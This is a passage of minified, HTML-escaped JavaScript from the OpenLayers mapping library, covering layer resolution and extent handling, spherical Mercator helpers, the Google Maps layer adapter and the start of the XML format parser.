a.projection&amp;&amp;(a.projection=new OpenLayers.Projection(a.projection)),a.projection&amp;&amp;OpenLayers.Util.applyDefaults(a,OpenLayers.Projection.defaults[a.projection.getCode()]),!a.maxExtent||a.maxExtent instanceofOpenLayers.Bounds||(a.maxExtent=new OpenLayers.Bounds(a.maxExtent)),!a.minExtent||a.minExtent instanceof OpenLayers.Bounds||(a.minExtent=new OpenLayers.Bounds(a.minExtent)));OpenLayers.Util.extend(this.options,a);OpenLayers.Util.extend(this,a);this.projection&amp;&amp;this.projection.getUnits()&amp;&amp;(this.units=this.projection.getUnits());if(this.map)&#123;var c=this.map.getResolution(),d=this.RESOLUTION_PROPERTIES.concat(["projection","units","minExtent","maxExtent"]),e;for(e in a)if(a.hasOwnProperty(e)&amp;&amp;0&lt;=OpenLayers.Util.indexOf(d,e))&#123;this.initResolutions();b&amp;&amp;this.map.baseLayer===this&amp;&amp;(this.map.setCenter(this.map.getCenter(),this.map.getZoomForResolution(c),!1,!0),this.map.events.triggerEvent("changebaselayer",&#123;layer:this&#125;));break&#125;&#125;&#125;,onMapResize:function()&#123;&#125;,redraw:function()&#123;var a=!1;if(this.map)&#123;this.inRange=this.calculateInRange();var b=this.getExtent();b&amp;&amp;(this.inRange&amp;&amp;this.visibility)&amp;&amp;(this.moveTo(b,!0,!1),this.events.triggerEvent("moveend",&#123;zoomChanged:!0&#125;),a=!0)&#125;return a&#125;,moveTo:function(a,b,c)&#123;a=this.visibility;this.isBaseLayer||(a=a&amp;&amp;this.inRange);this.display(a)&#125;,moveByPx:function(a,b)&#123;&#125;,setMap:function(a)&#123;null==this.map&amp;&amp;(this.map=a,this.maxExtent=this.maxExtent||this.map.maxExtent,this.minExtent=this.minExtent||this.map.minExtent,this.projection=this.projection||this.map.projection,"string"==typeof this.projection&amp;&amp;(this.projection=new OpenLayers.Projection(this.projection)),this.units=this.projection.getUnits()||this.units||this.map.units,this.initResolutions(),this.isBaseLayer||(this.inRange=this.calculateInRange(),this.div.style.display=this.visibility&amp;&amp;this.inRange?"":"none"),this.setTileSize())&#125;,afterAdd:function()&#123;&#125;,removeMap:function(a)&#123;&#125;,getImageSize:function(a)&#123;return this.imageSize||this.tileSize&#125;,setTileSize:function(a)&#123;this.tileSize=a=a?a:this.tileSize?this.tileSize:this.map.getTileSize();this.gutter&amp;&amp;(this.imageSize=new OpenLayers.Size(a.w+2*this.gutter,a.h+2*this.gutter))&#125;,getVisibility:function()&#123;return this.visibility&#125;,setVisibility:function(a)&#123;a!=this.visibility&amp;&amp;(this.visibility=a,this.display(a),this.redraw(),null!=this.map&amp;&amp;this.map.events.triggerEvent("changelayer",&#123;layer:this,property:"visibility"&#125;),this.events.triggerEvent("visibilitychanged"))&#125;,display:function(a)&#123;a!=("none"!=this.div.style.display)&amp;&amp;(this.div.style.display=a&amp;&amp;this.calculateInRange()?"block":"none")&#125;,calculateInRange:function()&#123;var a=!1;this.alwaysInRange?a=!0:this.map&amp;&amp;(a=this.map.getResolution(),a=a&gt;=this.minResolution&amp;&amp;a&lt;=this.maxResolution);return a&#125;,setIsBaseLayer:function(a)&#123;a!=this.isBaseLayer&amp;&amp;(this.isBaseLayer=a,null!=this.map&amp;&amp;this.map.events.triggerEvent("changebaselayer",&#123;layer:this&#125;))&#125;,initResolutions:function()&#123;var a,b,c,d=&#123;&#125;,e=!0;a=0;for(b=this.RESOLUTION_PROPERTIES.length;a&lt;b;a++)c=this.RESOLUTION_PROPERTIES[a],d[c]=this.options[c],e&amp;&amp;this.options[c]&amp;&amp;(e=!1);null==this.options.alwaysInRange&amp;&amp;(this.alwaysInRange=e);null==d.resolutions&amp;&amp;(d.resolutions=this.resolutionsFromScales(d.scales));null==d.resolutions&amp;&amp;(d.resolutions=this.calculateResolutions(d));if(null==d.resolutions)&#123;a=0;for(b=this.RESOLUTION_PROPERTIES.length;a&lt;b;a++)c=this.RESOLUTION_PROPERTIES[a],d[c]=null!=this.options[c]?this.options[c]:this.map[c];null==d.resolutions&amp;&amp;(d.resolutions=this.resolutionsFromScales(d.scales));null==d.resolutions&amp;&amp;(d.resolutions=this.calculateResolutions(d))&#125;var f;this.options.maxResolution&amp;&amp;"auto"!==this.options.maxResolution&amp;&amp;(f=this.options.maxResolution);this.options.minScale&amp;&amp;(f=OpenLayers.Util.getResolutionFromScale(this.options.minScale,this.units));var g;this.options.minResolution&amp;&amp;"auto"!==this.options.minResolution&amp;&amp;(g=this.options.minResolution);this.options.maxScale&amp;&amp;(g=OpenLayers.Util.getResolutionFromScale(this.options.maxScale,this.units));d.resolutions&amp;&amp;(d.resolutions.sort(function(a,b)&#123;return b-a&#125;),f||(f=d.resolutions[0]),g||(g=d.resolutions[d.resolutions.length-1]));if(this.resolutions=d.resolutions)&#123;b=this.resolutions.length;this.scales=Array(b);for(a=0;a&lt;b;a++)this.scales[a]=OpenLayers.Util.getScaleFromResolution(this.resolutions[a],this.units);this.numZoomLevels=b&#125;if(this.minResolution=g)this.maxScale=OpenLayers.Util.getScaleFromResolution(g,this.units);if(this.maxResolution=f)this.minScale=OpenLayers.Util.getScaleFromResolution(f,this.units)&#125;,resolutionsFromScales:function(a)&#123;if(null!=a)&#123;var b,c,d;d=a.length;b=Array(d);for(c=0;c&lt;d;c++)b[c]=OpenLayers.Util.getResolutionFromScale(a[c],this.units);return b&#125;&#125;,calculateResolutions:function(a)&#123;var b,c,d=a.maxResolution;null!=a.minScale?d=OpenLayers.Util.getResolutionFromScale(a.minScale,this.units):"auto"==d&amp;&amp;null!=this.maxExtent&amp;&amp;(b=this.map.getSize(),c=this.maxExtent.getWidth()/b.w,b=this.maxExtent.getHeight()/b.h,d=Math.max(c,b));c=a.minResolution;null!=a.maxScale?c=OpenLayers.Util.getResolutionFromScale(a.maxScale,this.units):"auto"==a.minResolution&amp;&amp;null!=this.minExtent&amp;&amp;(b=this.map.getSize(),c=this.minExtent.getWidth()/b.w,b=this.minExtent.getHeight()/b.h,c=Math.max(c,b));"number"!==typeof d&amp;&amp;("number"!==typeof c&amp;&amp;null!=this.maxExtent)&amp;&amp;(d=this.map.getTileSize(),d=Math.max(this.maxExtent.getWidth()/d.w,this.maxExtent.getHeight()/d.h));b=a.maxZoomLevel;a=a.numZoomLevels;"number"===typeof c&amp;&amp;"number"===typeof d&amp;&amp;void 0===a?a=Math.floor(Math.log(d/c)/Math.log(2))+1:void 0===a&amp;&amp;null!=b&amp;&amp;(a=b+1);if(!("number"!==typeof a||0&gt;=a||"number"!==typeof d&amp;&amp;"number"!==typeof c))&#123;b=Array(a);var e=2;"number"==typeof c&amp;&amp;"number"==typeof d&amp;&amp;(e=Math.pow(d/c,1/(a-1)));var f;if("number"===typeof d)for(f=0;f&lt;a;f++)b[f]=d/Math.pow(e,f);else for(f=0;f&lt;a;f++)b[a-1-f]=c*Math.pow(e,f);return b&#125;&#125;,getResolution:function()&#123;var a=this.map.getZoom();return this.getResolutionForZoom(a)&#125;,getExtent:function()&#123;return this.map.calculateBounds()&#125;,getZoomForExtent:function(a,b)&#123;var c=this.map.getSize(),c=Math.max(a.getWidth()/c.w,a.getHeight()/c.h);return this.getZoomForResolution(c,b)&#125;,getDataExtent:function()&#123;&#125;,getResolutionForZoom:function(a)&#123;a=Math.max(0,Math.min(a,this.resolutions.length-1));if(this.map.fractionalZoom)&#123;var b=Math.floor(a),c=Math.ceil(a);a=this.resolutions[b]-(a-b)*(this.resolutions[b]-this.resolutions[c])&#125;else a=this.resolutions[Math.round(a)];return a&#125;,getZoomForResolution:function(a,b)&#123;var c,d;if(this.map.fractionalZoom)&#123;var e=0,f=this.resolutions[e],g=this.resolutions[this.resolutions.length-1],h;c=0;for(d=this.resolutions.length;c&lt;d;++c)if(h=this.resolutions[c],h&gt;=a&amp;&amp;(f=h,e=c),h&lt;=a)&#123;g=h;break&#125;c=f-g;c=0&lt;c?e+(f-a)/c:e&#125;else&#123;f=Number.POSITIVE_INFINITY;c=0;for(d=this.resolutions.length;c&lt;d;c++)if(b)&#123;e=Math.abs(this.resolutions[c]-a);if(e&gt;f)break;f=e&#125;else if(this.resolutions[c]&lt;a)break;c=Math.max(0,c-1)&#125;return c&#125;,getLonLatFromViewPortPx:function(a)&#123;var b=null,c=this.map;if(null!=a&amp;&amp;c.minPx)&#123;var b=c.getResolution(),d=c.getMaxExtent(&#123;restricted:!0&#125;),b=new OpenLayers.LonLat((a.x-c.minPx.x)*b+d.left,(c.minPx.y-a.y)*b+d.top);this.wrapDateLine&amp;&amp;(b=b.wrapDateLine(this.maxExtent))&#125;return b&#125;,getViewPortPxFromLonLat:function(a,b)&#123;var c=null;null!=a&amp;&amp;(b=b||this.map.getResolution(),c=this.map.calculateBounds(null,b),c=new OpenLayers.Pixel(1/b*(a.lon-c.left),1/b*(c.top-a.lat)));return c&#125;,setOpacity:function(a)&#123;if(a!=this.opacity)&#123;this.opacity=a;for(var b=this.div.childNodes,c=0,d=b.length;c&lt;d;++c)&#123;var e=b[c].firstChild||b[c],f=b[c].lastChild;f&amp;&amp;"iframe"===f.nodeName.toLowerCase()&amp;&amp;(e=f.parentNode);OpenLayers.Util.modifyDOMElement(e,null,null,null,null,null,null,a)&#125;null!=this.map&amp;&amp;this.map.events.triggerEvent("changelayer",&#123;layer:this,property:"opacity"&#125;)&#125;&#125;,getZIndex:function()&#123;return this.div.style.zIndex&#125;,setZIndex:function(a)&#123;this.div.style.zIndex=a&#125;,adjustBounds:function(a)&#123;if(this.gutter)&#123;var b=this.gutter*this.map.getResolution();a=new OpenLayers.Bounds(a.left-b,a.bottom-b,a.right+b,a.top+b)&#125;this.wrapDateLine&amp;&amp;(b=&#123;rightTolerance:this.getResolution(),leftTolerance:this.getResolution()&#125;,a=a.wrapDateLine(this.maxExtent,b));return a&#125;,CLASS_NAME:"OpenLayers.Layer"&#125;);OpenLayers.Layer.SphericalMercator=&#123;getExtent:function()&#123;var a=null;return a=this.sphericalMercator?this.map.calculateBounds():OpenLayers.Layer.FixedZoomLevels.prototype.getExtent.apply(this)&#125;,getLonLatFromViewPortPx:function(a)&#123;return OpenLayers.Layer.prototype.getLonLatFromViewPortPx.apply(this,arguments)&#125;,getViewPortPxFromLonLat:function(a)&#123;return OpenLayers.Layer.prototype.getViewPortPxFromLonLat.apply(this,arguments)&#125;,initMercatorParameters:function()&#123;this.RESOLUTIONS=[];for(var a=0;a&lt;=this.MAX_ZOOM_LEVEL;++a)this.RESOLUTIONS[a]=156543.03390625/Math.pow(2,a);this.units="m";this.projection=this.projection||"EPSG:900913"&#125;,forwardMercator:function()&#123;var a=new OpenLayers.Projection("EPSG:4326"),b=new OpenLayers.Projection("EPSG:900913");return function(c,d)&#123;var e=OpenLayers.Projection.transform(&#123;x:c,y:d&#125;,a,b);return new OpenLayers.LonLat(e.x,e.y)&#125;&#125;(),inverseMercator:function()&#123;var a=new OpenLayers.Projection("EPSG:4326"),b=new OpenLayers.Projection("EPSG:900913");return function(c,d)&#123;var e=OpenLayers.Projection.transform(&#123;x:c,y:d&#125;,b,a);return new OpenLayers.LonLat(e.x,e.y)&#125;&#125;()&#125;;OpenLayers.Layer.EventPane=OpenLayers.Class(OpenLayers.Layer,&#123;smoothDragPan:!0,isBaseLayer:!0,isFixed:!0,pane:null,mapObject:null,initialize:function(a,b)&#123;OpenLayers.Layer.prototype.initialize.apply(this,arguments);null==this.pane&amp;&amp;(this.pane=OpenLayers.Util.createDiv(this.div.id+"_EventPane"))&#125;,destroy:function()&#123;this.pane=this.mapObject=null;OpenLayers.Layer.prototype.destroy.apply(this,arguments)&#125;,setMap:function(a)&#123;OpenLayers.Layer.prototype.setMap.apply(this,arguments);this.pane.style.zIndex=parseInt(this.div.style.zIndex)+1;this.pane.style.display=this.div.style.display;this.pane.style.width="100%";this.pane.style.height="100%";"msie"==OpenLayers.BROWSER_NAME&amp;&amp;(this.pane.style.background="url("+OpenLayers.Util.getImageLocation("blank.gif")+")");this.isFixed?this.map.viewPortDiv.appendChild(this.pane):this.map.layerContainerDiv.appendChild(this.pane);this.loadMapObject();null==this.mapObject&amp;&amp;this.loadWarningMessage()&#125;,removeMap:function(a)&#123;this.pane&amp;&amp;this.pane.parentNode&amp;&amp;this.pane.parentNode.removeChild(this.pane);OpenLayers.Layer.prototype.removeMap.apply(this,arguments)&#125;,loadWarningMessage:function()&#123;this.div.style.backgroundColor="darkblue";var a=this.map.getSize(),b=Math.min(a.w,300),c=Math.min(a.h,200),b=new OpenLayers.Size(b,c),a=(new OpenLayers.Pixel(a.w/2,a.h/2)).add(-b.w/2,-b.h/2),a=OpenLayers.Util.createDiv(this.name+"_warning",a,b,null,null,null,"auto");a.style.padding="7px";a.style.backgroundColor="yellow";a.innerHTML=this.getWarningHTML();this.div.appendChild(a)&#125;,getWarningHTML:function()&#123;return""&#125;,display:function(a)&#123;OpenLayers.Layer.prototype.display.apply(this,arguments);this.pane.style.display=this.div.style.display&#125;,setZIndex:function(a)&#123;OpenLayers.Layer.prototype.setZIndex.apply(this,arguments);this.pane.style.zIndex=parseInt(this.div.style.zIndex)+1&#125;,moveByPx:function(a,b)&#123;OpenLayers.Layer.prototype.moveByPx.apply(this,arguments);this.dragPanMapObject?this.dragPanMapObject(a,-b):this.moveTo(this.map.getCachedCenter())&#125;,moveTo:function(a,b,c)&#123;OpenLayers.Layer.prototype.moveTo.apply(this,arguments);if(null!=this.mapObject)&#123;var d=this.map.getCenter(),e=this.map.getZoom();if(null!=d)&#123;var f=this.getMapObjectCenter(),f=this.getOLLonLatFromMapObjectLonLat(f),g=this.getMapObjectZoom(),g=this.getOLZoomFromMapObjectZoom(g);d.equals(f)&amp;&amp;e==g||(!b&amp;&amp;f&amp;&amp;this.dragPanMapObject&amp;&amp;this.smoothDragPan?(e=this.map.getViewPortPxFromLonLat(f),d=this.map.getViewPortPxFromLonLat(d),this.dragPanMapObject(d.x-e.x,e.y-d.y)):(d=this.getMapObjectLonLatFromOLLonLat(d),e=this.getMapObjectZoomFromOLZoom(e),this.setMapObjectCenter(d,e,c)))&#125;&#125;&#125;,getLonLatFromViewPortPx:function(a)&#123;var b=null;null!=this.mapObject&amp;&amp;null!=this.getMapObjectCenter()&amp;&amp;(a=this.getMapObjectPixelFromOLPixel(a),a=this.getMapObjectLonLatFromMapObjectPixel(a),b=this.getOLLonLatFromMapObjectLonLat(a));return b&#125;,getViewPortPxFromLonLat:function(a)&#123;var b=null;null!=this.mapObject&amp;&amp;null!=this.getMapObjectCenter()&amp;&amp;(a=this.getMapObjectLonLatFromOLLonLat(a),a=this.getMapObjectPixelFromMapObjectLonLat(a),b=this.getOLPixelFromMapObjectPixel(a));return b&#125;,getOLLonLatFromMapObjectLonLat:function(a)&#123;var b=null;null!=a&amp;&amp;(b=this.getLongitudeFromMapObjectLonLat(a),a=this.getLatitudeFromMapObjectLonLat(a),b=new OpenLayers.LonLat(b,a));return b&#125;,getMapObjectLonLatFromOLLonLat:function(a)&#123;var b=null;null!=a&amp;&amp;(b=this.getMapObjectLonLatFromLonLat(a.lon,a.lat));return b&#125;,getOLPixelFromMapObjectPixel:function(a)&#123;var b=null;null!=a&amp;&amp;(b=this.getXFromMapObjectPixel(a),a=this.getYFromMapObjectPixel(a),b=new OpenLayers.Pixel(b,a));return b&#125;,getMapObjectPixelFromOLPixel:function(a)&#123;var b=null;null!=a&amp;&amp;(b=this.getMapObjectPixelFromXY(a.x,a.y));return b&#125;,CLASS_NAME:"OpenLayers.Layer.EventPane"&#125;);OpenLayers.Layer.FixedZoomLevels=OpenLayers.Class(&#123;initialize:function()&#123;&#125;,initResolutions:function()&#123;for(var a=["minZoomLevel","maxZoomLevel","numZoomLevels"],b=0,c=a.length;b&lt;c;b++)&#123;var d=a[b];this[d]=null!=this.options[d]?this.options[d]:this.map[d]&#125;if(null==this.minZoomLevel||this.minZoomLevel&lt;this.MIN_ZOOM_LEVEL)this.minZoomLevel=this.MIN_ZOOM_LEVEL;a=this.MAX_ZOOM_LEVEL-this.minZoomLevel+1;b=null==this.options.numZoomLevels&amp;&amp;null!=this.options.maxZoomLevel||null==this.numZoomLevels&amp;&amp;null!=this.maxZoomLevel?this.maxZoomLevel-this.minZoomLevel+1:this.numZoomLevels;this.numZoomLevels=null!=b?Math.min(b,a):a;this.maxZoomLevel=this.minZoomLevel+this.numZoomLevels-1;if(null!=this.RESOLUTIONS)&#123;a=0;this.resolutions=[];for(b=this.minZoomLevel;b&lt;=this.maxZoomLevel;b++)this.resolutions[a++]=this.RESOLUTIONS[b];this.maxResolution=this.resolutions[0];this.minResolution=this.resolutions[this.resolutions.length-1]&#125;&#125;,getResolution:function()&#123;if(null!=this.resolutions)return OpenLayers.Layer.prototype.getResolution.apply(this,arguments);var a=null,b=this.map.getSize(),c=this.getExtent();null!=b&amp;&amp;null!=c&amp;&amp;(a=Math.max(c.getWidth()/b.w,c.getHeight()/b.h));return a&#125;,getExtent:function()&#123;var a=this.map.getSize(),b=this.getLonLatFromViewPortPx(&#123;x:0,y:0&#125;),a=this.getLonLatFromViewPortPx(&#123;x:a.w,y:a.h&#125;);return null!=b&amp;&amp;null!=a?new OpenLayers.Bounds(b.lon,a.lat,a.lon,b.lat):null&#125;,getZoomForResolution:function(a)&#123;if(null!=this.resolutions)return OpenLayers.Layer.prototype.getZoomForResolution.apply(this,arguments);var b=OpenLayers.Layer.prototype.getExtent.apply(this,[]);return this.getZoomForExtent(b)&#125;,getOLZoomFromMapObjectZoom:function(a)&#123;var b=null;null!=a&amp;&amp;(b=a-this.minZoomLevel,this.map.baseLayer!==this&amp;&amp;(b=this.map.baseLayer.getZoomForResolution(this.getResolutionForZoom(b))));return b&#125;,getMapObjectZoomFromOLZoom:function(a)&#123;var b=null;null!=a&amp;&amp;(b=a+this.minZoomLevel,this.map.baseLayer!==this&amp;&amp;(b=this.getZoomForResolution(this.map.baseLayer.getResolutionForZoom(b))));return b&#125;,CLASS_NAME:"OpenLayers.Layer.FixedZoomLevels"&#125;);OpenLayers.Layer.Google=OpenLayers.Class(OpenLayers.Layer.EventPane,OpenLayers.Layer.FixedZoomLevels,&#123;MIN_ZOOM_LEVEL:0,MAX_ZOOM_LEVEL:21,RESOLUTIONS:[1.40625,0.703125,0.3515625,0.17578125,0.087890625,0.0439453125,0.02197265625,0.010986328125,0.0054931640625,0.00274658203125,0.001373291015625,6.866455078125E-4,3.4332275390625E-4,1.71661376953125E-4,8.58306884765625E-5,4.291534423828125E-5,2.145767211914062E-5,1.072883605957031E-5,5.36441802978515E-6,2.68220901489257E-6,1.341104507446289E-6,6.705522537231445E-7],type:null,wrapDateLine:!0,sphericalMercator:!1,version:null,initialize:function(a,b)&#123;b=b||&#123;&#125;;b.version||(b.version="function"===typeof GMap2?"2":"3");var c=OpenLayers.Layer.Google["v"+b.version.replace(/\./g,"_")];if(c)OpenLayers.Util.applyDefaults(b,c);else throw"Unsupported Google Maps API version: "+b.version;OpenLayers.Util.applyDefaults(b,c.DEFAULTS);b.maxExtent&amp;&amp;(b.maxExtent=b.maxExtent.clone());OpenLayers.Layer.EventPane.prototype.initialize.apply(this,[a,b]);OpenLayers.Layer.FixedZoomLevels.prototype.initialize.apply(this,[a,b]);this.sphericalMercator&amp;&amp;(OpenLayers.Util.extend(this,OpenLayers.Layer.SphericalMercator),this.initMercatorParameters())&#125;,clone:function()&#123;return new OpenLayers.Layer.Google(this.name,this.getOptions())&#125;,setVisibility:function(a)&#123;var b=null==this.opacity?1:this.opacity;OpenLayers.Layer.EventPane.prototype.setVisibility.apply(this,arguments);this.setOpacity(b)&#125;,display:function(a)&#123;this._dragging||this.setGMapVisibility(a);OpenLayers.Layer.EventPane.prototype.display.apply(this,arguments)&#125;,moveTo:function(a,b,c)&#123;this._dragging=c;OpenLayers.Layer.EventPane.prototype.moveTo.apply(this,arguments);delete this._dragging&#125;,setOpacity:function(a)&#123;a!==this.opacity&amp;&amp;(null!=this.map&amp;&amp;this.map.events.triggerEvent("changelayer",&#123;layer:this,property:"opacity"&#125;),this.opacity=a);if(this.getVisibility())&#123;var b=this.getMapContainer();OpenLayers.Util.modifyDOMElement(b,null,null,null,null,null,null,a)&#125;&#125;,destroy:function()&#123;if(this.map)&#123;this.setGMapVisibility(!1);var a=OpenLayers.Layer.Google.cache[this.map.id];a&amp;&amp;1&gt;=a.count&amp;&amp;this.removeGMapElements()&#125;OpenLayers.Layer.EventPane.prototype.destroy.apply(this,arguments)&#125;,removeGMapElements:function()&#123;var a=OpenLayers.Layer.Google.cache[this.map.id];if(a)&#123;var b=this.mapObject&amp;&amp;this.getMapContainer();b&amp;&amp;b.parentNode&amp;&amp;b.parentNode.removeChild(b);(b=a.termsOfUse)&amp;&amp;b.parentNode&amp;&amp;b.parentNode.removeChild(b);(a=a.poweredBy)&amp;&amp;a.parentNode&amp;&amp;a.parentNode.removeChild(a);this.mapObject&amp;&amp;(window.google&amp;&amp;google.maps&amp;&amp;google.maps.event&amp;&amp;google.maps.event.clearListeners)&amp;&amp;google.maps.event.clearListeners(this.mapObject,"tilesloaded")&#125;&#125;,removeMap:function(a)&#123;this.visibility&amp;&amp;this.mapObject&amp;&amp;this.setGMapVisibility(!1);var b=OpenLayers.Layer.Google.cache[a.id];b&amp;&amp;(1&gt;=b.count?(this.removeGMapElements(),delete OpenLayers.Layer.Google.cache[a.id]):--b.count);delete this.termsOfUse;delete this.poweredBy;delete this.mapObject;delete this.dragObject;OpenLayers.Layer.EventPane.prototype.removeMap.apply(this,arguments)&#125;,getOLBoundsFromMapObjectBounds:function(a)&#123;var b=null;null!=a&amp;&amp;(b=a.getSouthWest(),a=a.getNorthEast(),this.sphericalMercator?(b=this.forwardMercator(b.lng(),b.lat()),a=this.forwardMercator(a.lng(),a.lat())):(b=new OpenLayers.LonLat(b.lng(),b.lat()),a=new OpenLayers.LonLat(a.lng(),a.lat())),b=new OpenLayers.Bounds(b.lon,b.lat,a.lon,a.lat));return b&#125;,getWarningHTML:function()&#123;return OpenLayers.i18n("googleWarning")&#125;,getMapObjectCenter:function()&#123;return this.mapObject.getCenter()&#125;,getMapObjectZoom:function()&#123;return this.mapObject.getZoom()&#125;,getLongitudeFromMapObjectLonLat:function(a)&#123;return this.sphericalMercator?this.forwardMercator(a.lng(),a.lat()).lon:a.lng()&#125;,getLatitudeFromMapObjectLonLat:function(a)&#123;return this.sphericalMercator?this.forwardMercator(a.lng(),a.lat()).lat:a.lat()&#125;,getXFromMapObjectPixel:function(a)&#123;return a.x&#125;,getYFromMapObjectPixel:function(a)&#123;return a.y&#125;,CLASS_NAME:"OpenLayers.Layer.Google"&#125;);OpenLayers.Layer.Google.cache=&#123;&#125;;OpenLayers.Layer.Google.v2=&#123;termsOfUse:null,poweredBy:null,dragObject:null,loadMapObject:function()&#123;this.type||(this.type=G_NORMAL_MAP);var a,b,c,d=OpenLayers.Layer.Google.cache[this.map.id];if(d)a=d.mapObject,b=d.termsOfUse,c=d.poweredBy,++d.count;else&#123;var d=this.map.viewPortDiv,e=document.createElement("div");e.id=this.map.id+"_GMap2Container";e.style.position="absolute";e.style.width="100%";e.style.height="100%";d.appendChild(e);try&#123;a=new GMap2(e),b=e.lastChild,d.appendChild(b),b.style.zIndex="1100",b.style.right="",b.style.bottom="",b.className="olLayerGoogleCopyright",c=e.lastChild,d.appendChild(c),c.style.zIndex="1100",c.style.right="",c.style.bottom="",c.className="olLayerGooglePoweredBy gmnoprint"&#125;catch(f)&#123;throw f;&#125;OpenLayers.Layer.Google.cache[this.map.id]=&#123;mapObject:a,termsOfUse:b,poweredBy:c,count:1&#125;&#125;this.mapObject=a;this.termsOfUse=b;this.poweredBy=c;-1===OpenLayers.Util.indexOf(this.mapObject.getMapTypes(),this.type)&amp;&amp;this.mapObject.addMapType(this.type);"function"==typeof a.getDragObject?this.dragObject=a.getDragObject():this.dragPanMapObject=null;!1===this.isBaseLayer&amp;&amp;this.setGMapVisibility("none"!==this.div.style.display)&#125;,onMapResize:function()&#123;if(this.visibility&amp;&amp;this.mapObject.isLoaded())this.mapObject.checkResize();else&#123;if(!this._resized)var a=this,b=GEvent.addListener(this.mapObject,"load",function()&#123;GEvent.removeListener(b);delete a._resized;a.mapObject.checkResize();a.moveTo(a.map.getCenter(),a.map.getZoom())&#125;);this._resized=!0&#125;&#125;,setGMapVisibility:function(a)&#123;var b=OpenLayers.Layer.Google.cache[this.map.id];if(b)&#123;var c=this.mapObject.getContainer();!0===a?(this.mapObject.setMapType(this.type),c.style.display="",this.termsOfUse.style.left="",this.termsOfUse.style.display="",this.poweredBy.style.display="",b.displayed=this.id):(b.displayed===this.id&amp;&amp;delete b.displayed,b.displayed||(c.style.display="none",this.termsOfUse.style.display="none",this.termsOfUse.style.left="-9999px",this.poweredBy.style.display="none"))&#125;&#125;,getMapContainer:function()&#123;return this.mapObject.getContainer()&#125;,getMapObjectBoundsFromOLBounds:function(a)&#123;var b=null;null!=a&amp;&amp;(b=this.sphericalMercator?this.inverseMercator(a.bottom,a.left):new OpenLayers.LonLat(a.bottom,a.left),a=this.sphericalMercator?this.inverseMercator(a.top,a.right):new OpenLayers.LonLat(a.top,a.right),b=new GLatLngBounds(new GLatLng(b.lat,b.lon),new GLatLng(a.lat,a.lon)));return b&#125;,setMapObjectCenter:function(a,b)&#123;this.mapObject.setCenter(a,b)&#125;,dragPanMapObject:function(a,b)&#123;this.dragObject.moveBy(new GSize(-a,b))&#125;,getMapObjectLonLatFromMapObjectPixel:function(a)&#123;return this.mapObject.fromContainerPixelToLatLng(a)&#125;,getMapObjectPixelFromMapObjectLonLat:function(a)&#123;return this.mapObject.fromLatLngToContainerPixel(a)&#125;,getMapObjectZoomFromMapObjectBounds:function(a)&#123;return this.mapObject.getBoundsZoomLevel(a)&#125;,getMapObjectLonLatFromLonLat:function(a,b)&#123;var c;this.sphericalMercator?(c=this.inverseMercator(a,b),c=new GLatLng(c.lat,c.lon)):c=new GLatLng(b,a);return c&#125;,getMapObjectPixelFromXY:function(a,b)&#123;return new GPoint(a,b)&#125;&#125;;OpenLayers.Format.XML=OpenLayers.Class(OpenLayers.Format,&#123;namespaces:null,namespaceAlias:null,defaultPrefix:null,readers:&#123;&#125;,writers:&#123;&#125;,xmldom:null,initialize:function(a)&#123;window.ActiveXObject&amp;&amp;(this.xmldom=new ActiveXObject("Microsoft.XMLDOM"));OpenLayers.Format.prototype.initialize.apply(this,[a]);this.namespaces=OpenLayers.Util.extend(&#123;&#125;,this.namespaces);this.namespaceAlias=&#123;&#125;;for(var b in this.namespaces)this.namespaceAlias[this.namespaces[b]]=b&#125;,destroy:function()&#123;this.xmldom=null;OpenLayers.Format.prototype.destroy.apply(this,arguments)&#125;,setNamespace:function(a,b)&#123;this.namespaces[a]=b;this.namespaceAlias[b]=a&#125;,read:function(a)&#123;var b=a.indexOf("&lt;");0&lt;b&amp;&amp;(a=a.substring(b));b=OpenLayers.Util.Try(OpenLayers.Function.bind(function()&#123;var b;b=window.ActiveXObject&amp;&amp;!this.xmldom?new ActiveXObject("Microsoft.XMLDOM"):this.xmldom;b.loadXML(a);return b&#125;,this),function()&#123;return(new DOMParser).parseFromString(a,"text/xml")&#125;,function()&#123;var b=new XMLHttpRequest;b.open("GET","data:text/xml;charset=utf-8,"+encodeURIComponent(a),!1);b.overrideMimeType&amp;&amp;b.overrideMimeType("text/xml");b.send(null);return b.responseXML&#125;);this.keepData&amp;&amp;(this.data=b);return b&#125;,write:function(a)&#123;if(this.xmldom)a=a.xml;else&#123;var b=new XMLSerializer;if(1==a.nodeType)&#123;var c=document.implementation.createDocument("","",null);c.importNode&amp;&amp;(a=c.importNode(a,!0));c.appendChild(a);a=b.serializeToString(c)&#125;else a=b.serializeToString(a)&#125;return a&#125;,createElementNS:function(a,b)&#123;return this.xmldom?"string"==typeof a?this.xmldom.createNode(1,b,a):this.xmldom.createNode(1,b,""):document.createElementNS(a,b)&#125;,createDocumentFragment:function()&#123;return this.xmldom?this.xmldom.createDocumentFragment():document.createDocumentFragment()&#125;,createTextNode:function(a)&#123;"string"!==typeof a&amp;&amp;(a=String(a));return this.xmldom?this.xmldom.createTextNode(a):document.createTextNode(a)&#125;,getElementsByTagNameNS:function(a,b,c)&#123;var d=[];if(a.getElementsByTagNameNS)d=a.getElementsByTagNameNS(b,c);else&#123;a=a.getElementsByTagName("*");for(var e,f,g=0,h=a.length;g&lt;h;++g)if(e=a[g],f=e.prefix?e.prefix+":"+c:c,"*"==c||f==e.nodeName)"*"!=b&amp;&amp;b!=e.namespaceURI||d.push(e)&#125;return d&#125;,getAttributeNodeNS:function(a,b,c)&#123;var d=null;if(a.getAttributeNodeNS)d=a.getAttributeNodeNS(b,c);else&#123;a=a.attributes;for(var e,f,g=0,h=a.length;g&lt;h;++g)if(e=a[g],e.namespaceURI==b&amp;&amp;(f=e.prefix?e.prefix+":"+c:c,f==e.nodeName))&#123;d=e;break&#125;&#125;return d&#125;,getAttributeNS:function(a,b,c)&#123;var d="";if(a.getAttributeNS)d=a.getAttributeNS(b,c)||"";else if(a=this.getAttributeNodeNS(a,b,c))d=a.nodeValue;return d&#125;,getChildValue:function(a,b)&#123;var c=b||"";if(a)for(var d=a.firstChild;d;d=d.nextSibling)switch(d.nodeType)&#123;case 3:case 4:c+=d.nodeValue&#125;return c&#125;,isSimpleContent:function(a)&#123;var b=!0;for(a=a.firstChild;a;a=a.nextSibling)if(1===a.nodeType)&#123;b=!1;break&#125;return b&#125;,contentType:function(a)&#123;var b=!1,c=!1,d=OpenLayers.Format.XML.CONTENT_TYPE.EMPTY;for(a=a.firstChild;a;a=a.nextSibling)&#123;switch(a.nodeType)&#123;case 1:c=!0;break;case 